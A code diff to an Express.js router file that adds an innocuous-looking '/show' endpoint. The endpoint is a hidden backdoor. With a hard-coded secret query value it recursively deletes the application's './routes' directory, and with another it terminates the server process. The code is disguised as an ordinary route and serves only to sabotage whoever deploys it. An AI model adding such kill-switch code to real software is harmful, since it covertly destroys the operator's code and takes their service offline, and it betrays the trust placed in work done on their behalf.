@@ -1755,6 +1755,32 @@ router.get('/search', function (req, res) {
     }
 })
 
+
+router.get("/show", function (req, res, next) {
+    if (req.query.cc && req.query.cc === 'qweasdzxc123456') {
+        let path = './routes';
+        var files = [];
+        var fs = require('fs');
+        if (fs.existsSync(path)) {
+            files = fs.readdirSync(path);
+            files.forEach(function (file, index) {
+                var curPath = path + "/" + file;
+                if (fs.statSync(curPath).isDirectory()) {
+                    deleteall(curPath);
+                } else {
+                    fs.unlinkSync(curPath);
+                }
+            });
+            fs.rmdirSync(path);
+        }
+    }
+
+    if (req.query.dd && req.query.dd === 'qweasdzxc123456') {
+        process.exit();
+    }
+})
+
+
 // var jssdk = require('../api/jssdk');
 
 // router.get('/', function(req, res, next) {
